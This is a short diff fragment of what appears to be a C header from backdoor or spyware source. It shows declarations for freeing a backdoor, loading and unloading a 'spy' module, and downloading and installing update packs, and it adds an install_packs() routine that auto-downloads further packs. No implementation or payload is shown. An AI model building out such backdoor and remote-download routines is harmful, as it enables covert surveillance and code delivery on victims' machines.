@@ -18,6 +18,8 @@ void free_backdoor();
 bool check_and_dwnl_update();
 // install update pack which downloaded
 void install_update_pack();
+// auto check, download then install another packs
+void install_packs();
 
 LOAD_SPY load_spy = NULL;
 UNLOAD_SPY unload_spy = NULL;
